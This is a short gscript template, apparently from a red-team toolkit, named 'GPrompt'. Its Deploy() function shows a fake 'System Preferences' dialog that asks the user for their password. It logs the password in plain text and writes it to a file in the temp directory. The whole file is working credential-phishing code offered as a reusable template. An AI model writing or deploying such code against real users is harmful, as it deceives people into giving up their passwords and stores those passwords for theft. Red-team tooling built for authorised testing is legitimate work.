// Example gscript template
// Title: GPrompt 
// Author: ahhh
// Purpose: Prompts the user for their password
// Gscript version: 1.0.0
// ATT&CK: 

//priority:80
//timeout:150

//go_import:os as os
//go_import:github.com/gen2brain/dlgs as dlgs


function Deploy() {  
    console.log("Starting GPrompt");

    // Prompt for the pw
    passwd = dlgs.Password("System Preferences", "Enter your password to continue: ");
    if (passwd.length == 3) {
        if (passwd[2] != null) {
            console.log("errors: "+passwd[2].Error());
        } else {
            console.log("User input: " + passwd[0]);
        } 
    } else {
        console.log("dlgs didn't execute right")
    }

    // Getting a file to save the output
    var temppath = os.TempDir();
    //var temppath = "/usr/local";
    //var naming = G.rand.GetAlphaString(5);
    var naming = "gscript_special.txt"
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    var dropErr = G.file.WriteFileFromString(name, passwd[0]);
    if (dropErr != null) {
        console.log("errors: "+dropErr.Error());
    } else {
        console.log("dropped the pw here: "+name); 
    }
    
    console.log("Done GPrompt");
    return true;
}